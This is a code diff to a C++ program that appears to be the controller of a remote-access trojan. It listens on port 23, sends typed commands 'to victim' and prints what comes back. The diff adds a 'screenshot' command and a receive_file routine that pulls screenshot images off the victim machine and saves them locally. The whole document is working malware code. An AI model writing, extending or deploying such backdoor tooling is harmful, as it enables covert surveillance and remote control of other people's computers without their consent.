@@ -3,6 +3,7 @@
 #include <netinet/in.h>
 #include <unistd.h>
 #include <cstring>
+#include <fstream>
 
 #define PORT 23  // Port to listen on
 #define BUFFER_SIZE 1024  // Buffer for receiving data
@@ -52,6 +53,34 @@ int accept_connection(int server_fd) {
     return new_socket;
 }
 
+void receive_file(int client_socket, const char* filename) {
+    size_t fileSize;
+    recv(client_socket, (char*)&fileSize, sizeof(fileSize), 0);
+    if (fileSize <= 0) {
+        cerr << "Invalid file size received." << endl;
+        return;
+    }
+
+    char* fileBuffer = new char[fileSize];
+    size_t totalReceived = 0;
+    while (totalReceived < fileSize) {
+        int bytesReceived = recv(client_socket, fileBuffer + totalReceived, fileSize - totalReceived, 0);
+        if (bytesReceived <= 0) {
+            cerr << "Failed to receive file data." << endl;
+            delete[] fileBuffer;
+            return;
+        }
+        totalReceived += bytesReceived;
+    }
+
+    ofstream outFile(filename, ios::binary);
+    outFile.write(fileBuffer, fileSize);
+    outFile.close();
+    delete[] fileBuffer;
+
+    cout << "Screenshot saved as: " << filename << endl;
+}
+
 void free_navigate(int client_socket) {
     char buffer[BUFFER_SIZE] = {0};
 
@@ -67,8 +96,14 @@ void free_navigate(int client_socket) {
         // Send command to victim
         send(client_socket, command.c_str(), command.length(), 0);
 
+        // If the command is "screenshot", prepare to receive a file
+        if (command == "screenshot") {
+            receive_file(client_socket, "received_screenshot.bmp");
+            continue;
+        }
+
         // Receive response
-        memset(buffer, 0, BUFFER_SIZE);  // Clear buffer
+        memset(buffer, 0, BUFFER_SIZE);
         int bytesReceived = recv(client_socket, buffer, BUFFER_SIZE, 0);
         if (bytesReceived <= 0) {
             cerr << "Connection lost!" << endl;
@@ -106,5 +141,5 @@ int main() {
             return 0;
         }
     }
-    return 0;  
+    return 0;
 }
